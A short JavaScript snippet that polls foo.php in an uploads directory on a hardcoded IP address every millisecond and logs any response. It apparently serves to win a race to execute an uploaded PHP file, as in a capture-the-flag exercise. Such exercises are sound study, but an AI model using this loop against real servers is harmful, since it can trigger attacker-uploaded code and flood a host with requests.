const dirname = "1c26b8d70bf4842b78b5fdf1253db59f"; // get this from the server
setInterval(() => {
	fetch(`http://3.39.6.7:8000/uploads/${dirname}/foo.php`).then((res) => {
		if (res.ok) {
			res.text().then((text) => {
				console.log(text);
			})
		}
	});
}, 1);